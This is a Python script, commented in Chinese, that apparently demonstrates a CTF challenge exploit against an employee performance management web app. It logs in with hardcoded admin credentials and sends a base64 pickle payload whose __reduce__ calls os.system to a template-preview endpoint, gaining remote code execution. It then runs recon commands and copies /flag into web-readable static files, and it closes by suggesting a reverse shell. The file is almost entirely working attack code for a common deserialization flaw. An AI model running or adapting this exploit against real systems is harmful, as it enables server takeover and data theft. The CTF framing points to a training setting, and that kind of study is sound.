#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CTF题目完整攻击演示脚本
演示如何利用pickle反序列化漏洞获取flag
"""

import requests
import pickle
import base64
import os
import json
import time

class RCEPayload:
    """RCE payload类"""
    def __init__(self, command):
        self.command = command
    
    def __reduce__(self):
        return (os.system, (self.command,))

class ExploitDemo:
    """攻击演示类"""
    
    def __init__(self, target_url="http://localhost:5000"):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        
    def login(self, username="admin", password="admin@2024"):
        """登录系统"""
        print(f"[+] 尝试登录: {username}")
        
        login_data = {
            'username': username,
            'password': password
        }
        
        response = self.session.post(
            f"{self.target_url}/login",
            data=login_data,
            allow_redirects=True
        )
        
        if "仪表板" in response.text or "dashboard" in response.url:
            print("[+] 登录成功！")
            return True
        else:
            print("[-] 登录失败")
            return False
    
    def generate_payload(self, command):
        """生成pickle payload"""
        payload_obj = RCEPayload(command)
        pickled = pickle.dumps(payload_obj)
        encoded = base64.b64encode(pickled).decode('utf-8')
        return f"pickle:{encoded}"
    
    def exploit(self, command):
        """执行攻击"""
        print(f"[+] 生成payload执行命令: {command}")
        
        payload = self.generate_payload(command)
        
        attack_data = {
            "content": "攻击测试模板 {{test_var}}",
            "variables": payload
        }
        
        print("[+] 发送攻击载荷...")
        
        response = self.session.post(
            f"{self.target_url}/admin/templates/preview",
            json=attack_data,
            headers={'Content-Type': 'application/json'}
        )
        
        if response.status_code == 200:
            print("[+] 攻击载荷发送成功")
            result = response.json()
            
            if result.get('success'):
                print("[+] 命令执行成功！")
                return True
            else:
                print(f"[-] 执行失败: {result.get('error', '未知错误')}")
        else:
            print(f"[-] HTTP错误: {response.status_code}")
            
        return False
    
    def read_flag(self):
        """读取flag文件"""
        print("\n" + "="*50)
        print("尝试读取flag文件...")
        print("="*50)
        
        # 由于pickle.loads会执行命令但不返回输出，
        # 我们需要将输出重定向到一个可访问的位置
        commands = [
            "cat /flag > static/flag.txt",  # 将flag写入静态文件目录
            "cat /flag > templates/flag.txt",  # 备用位置
            "cp /flag /tmp/flag.txt",  # 复制到tmp目录
        ]
        
        for cmd in commands:
            if self.exploit(cmd):
                time.sleep(1)  # 等待文件写入
                
                # 尝试访问flag文件
                try:
                    flag_response = self.session.get(f"{self.target_url}/static/flag.txt")
                    if flag_response.status_code == 200 and "wmctf{" in flag_response.text:
                        print(f"[+] Flag获取成功: {flag_response.text.strip()}")
                        return flag_response.text.strip()
                except:
                    pass
        
        print("[-] 无法直接获取flag内容，但命令可能已执行")
        return None
    
    def demonstrate_rce(self):
        """演示RCE能力"""
        print("\n" + "="*50)
        print("演示远程代码执行能力...")
        print("="*50)
        
        demo_commands = [
            "whoami > static/whoami.txt",
            "id > static/id.txt", 
            "pwd > static/pwd.txt",
            "ls -la / > static/ls.txt",
            "ps aux > static/ps.txt"
        ]
        
        for cmd in demo_commands:
            print(f"\n[+] 执行: {cmd}")
            if self.exploit(cmd):
                time.sleep(0.5)
                
                # 尝试获取结果
                filename = cmd.split('>')[-1].strip()
                try:
                    result = self.session.get(f"{self.target_url}/{filename}")
                    if result.status_code == 200:
                        print(f"[+] 输出: {result.text[:200]}...")
                except:
                    pass

def main():
    """主函数"""
    print("="*60)
    print("CTF题目 - 员工绩效管理系统漏洞利用演示")
    print("漏洞类型: Python Pickle 反序列化 RCE")
    print("="*60)
    
    # 获取目标URL
    target = input("输入目标URL (默认: http://localhost:5000): ").strip()
    if not target:
        target = "http://localhost:5000"
    
    # 创建攻击实例
    exploit = ExploitDemo(target)
    
    # 登录
    if not exploit.login():
        print("[-] 无法登录，请检查目标系统和凭据")
        return
    
    # 演示基本RCE
    exploit.demonstrate_rce()
    
    # 获取flag
    flag = exploit.read_flag()
    
    if flag:
        print(f"\n🎉 攻击成功！Flag: {flag}")
    else:
        print("\n⚠️  攻击载荷已发送，但无法直接获取flag内容")
        print("   建议检查服务器日志或使用反弹shell")
    
    print("\n" + "="*60)
    print("攻击演示完成！")
    print("="*60)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n用户中断攻击")
    except Exception as e:
        print(f"\n攻击过程中发生错误: {e}") 